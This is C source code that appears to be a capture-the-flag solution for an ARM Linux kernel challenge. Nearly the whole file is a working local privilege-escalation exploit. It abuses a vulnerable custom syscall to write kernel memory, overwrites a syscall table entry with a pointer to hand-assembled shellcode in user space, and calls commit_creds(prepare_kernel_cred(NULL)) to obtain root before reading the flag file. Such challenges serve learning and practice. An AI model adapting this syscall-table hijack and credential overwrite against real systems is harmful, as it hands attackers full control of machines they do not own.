#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <unistd.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>

#define COMMIT_CREDS ((void*) 0x8003f56c)
#define PREPARE_KERNEL_CREDS ((void*) 0x8003f924)
#define SYS_CALL_TABLE 0x8000e348
#define NR_SYS_UNUSED 223

typedef void* (*prepare_kernel_creds_func_t)(void* daemon);
typedef int (*commit_creds_func_t)(void *new);

#define prepare_kernel_creds_func(daemon) \
    (((prepare_kernel_creds_func_t) PREPARE_KERNEL_CREDS)(daemon))

#define commit_creds_func(new) \
    (((commit_creds_func_t)(COMMIT_CREDS))(new))

uint32_t read_dword(void *addr)
{
    int i;
    /* Allocate and clean memory to store read result. */
    char read_buf[0x1000];
    memset(read_buf, 0x0, sizeof(read_buf));

    size_t read_bytes = 0;
    do
    {
        /* Read memory till reaching null byte. */
        syscall(NR_SYS_UNUSED, addr + read_bytes, &read_buf[read_bytes]);
        /* Check how many bytes we have managed to read. */
        read_bytes = strlen(read_buf) + 1;
    } while (read_bytes < 4);

    /* We cannot revert sys_upper, so return value might be wrong. */

    return *((uint32_t *)read_buf);
}

long userland_escalate()
{
    commit_creds_func(prepare_kernel_creds_func(NULL));
    return 0;
}

void *allocate_bridge_func()
{
    void *bridge_func, *ptr_userland_escalate;
    char bridge_func_body[] = {
        0x00, 0x48, 0x2d, 0xe9, // push {r11, lr}
        0x00, 0xb0, 0x8d, 0xe2, // add r11, sp, #0
        0x08, 0x20, 0x9f, 0xe5, // mov r2, [pc, #8]
        0x32, 0xff, 0x2f, 0xe1, // ldr r2
        0x00, 0xd0, 0x4b, 0xe2, // sub sp, r11, #0
        0x00, 0x88, 0xbd, 0xe8, // pop {r11, pc}
        0x41, 0x41, 0x41, 0x41  // fill with address of userland_escalate
    };
    ptr_userland_escalate = &userland_escalate;
    memcpy(&bridge_func_body[24], &ptr_userland_escalate, 4);

    bridge_func = mmap((void *)0x20202000, 0x1000, PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_FIXED | MAP_SHARED | MAP_LOCKED | MAP_POPULATE, -1, 0);
    if ((uint32_t) bridge_func == -1)
    {
        perror("[!] Failed to mmap");
        return NULL;
    }
    bridge_func += 0x20;

    memcpy(bridge_func, bridge_func_body, sizeof(bridge_func_body));
    return bridge_func;
}

int main()
{
    uint32_t **syscall_table;
    void *bridge_func;

    syscall_table = (uint32_t **)SYS_CALL_TABLE;
    bridge_func = allocate_bridge_func();
    if (!bridge_func)
        return -1;

    syscall(NR_SYS_UNUSED, &bridge_func, &syscall_table[80]);
    syscall(80);

    system("cat /root/flag");

    return 0;
}